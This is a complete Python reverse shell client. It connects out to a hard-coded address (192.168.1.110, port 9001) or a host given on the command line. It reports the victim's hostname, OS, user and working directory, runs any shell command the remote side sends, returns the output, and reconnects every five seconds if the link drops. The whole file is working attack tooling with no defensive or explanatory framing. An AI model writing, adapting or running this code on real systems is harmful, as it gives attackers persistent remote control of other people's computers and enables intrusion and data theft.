#!/usr/bin/env python3
import socket
import subprocess
import sys
import os
import platform
import time
import threading

def send_output(sock, message):
    """Helper to send output"""
    try:
        sock.send(message.encode())
    except:
        pass

def handle_client(sock):
    """Handle the reverse shell session"""
    try:
        # Send initial info
        system_info = f"{platform.system()} {platform.release()}"
        send_output(sock, f"\n[+] Connected from: {platform.node()}\n")
        send_output(sock, f"[+] System: {system_info}\n")
        send_output(sock, f"[+] User: {os.getlogin()}\n")
        send_output(sock, f"[+] Current dir: {os.getcwd()}\n\n")
        
        while True:
            try:
                # Send prompt
                prompt = f"\n[{os.getcwd()}] $ "
                send_output(sock, prompt)
                
                # Receive command (wait for newline)
                data = b""
                while True:
                    chunk = sock.recv(1)
                    if not chunk:
                        return
                    if chunk == b'\n':
                        break
                    data += chunk
                
                command = data.decode(errors='ignore').strip()
                
                if not command:
                    continue
                
                if command.lower() in ['exit', 'quit']:
                    send_output(sock, "[!] Exiting...\n")
                    break
                
                # Execute command
                try:
                    # Change directory command
                    if command.startswith("cd "):
                        new_dir = command[3:].strip()
                        try:
                            os.chdir(new_dir)
                            send_output(sock, f"[+] Changed directory to: {os.getcwd()}\n")
                        except Exception as e:
                            send_output(sock, f"[!] cd failed: {e}\n")
                        continue
                    
                    # Execute other commands
                    if platform.system().lower() == 'windows':
                        shell = True
                        process = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                    else:
                        shell = True
                        process = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                    
                    # Send output
                    if process.stdout:
                        send_output(sock, process.stdout)
                    if process.stderr:
                        send_output(sock, f"[stderr]\n{process.stderr}")
                    
                except subprocess.TimeoutExpired:
                    send_output(sock, "\n[!] Command timed out after 30 seconds\n")
                except Exception as e:
                    send_output(sock, f"\n[!] Error executing command: {str(e)}\n")
                    
            except socket.timeout:
                continue
            except ConnectionError:
                break
            except Exception as e:
                send_output(sock, f"\n[!] Error: {str(e)}\n")
                break
                
    except Exception as e:
        print(f"[!] Client error: {e}")

def connect_to_server(host='192.168.1.110', port=9001):
    """Connect and maintain connection"""
    while True:
        try:
            print(f"[*] Connecting to {host}:{port}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.settimeout(30)  # Longer timeout for commands
            print(f"[+] Connected successfully")
            
            # Handle the session
            handle_client(sock)
            
        except ConnectionRefusedError:
            print("[!] Connection refused. Is server running?")
        except socket.timeout:
            print("[!] Connection timeout")
        except Exception as e:
            print(f"[!] Connection error: {e}")
        
        # Cleanup and reconnect
        try:
            sock.close()
        except:
            pass
        
        print("[*] Reconnecting in 5 seconds...")
        time.sleep(5)

if __name__ == "__main__":
    print("="*50)
    print("REVERSE SHELL CLIENT (FIXED)")
    print("="*50)
    
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    elif len(sys.argv) == 2:
        host = sys.argv[1]
        port = 9001
    else:
        host = '192.168.1.110'
        port = 9001
    
    print(f"[*] Connecting to: {host}:{port}")
    print("[*] Press Ctrl+C to exit\n")
    
    try:
        connect_to_server(host, port)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")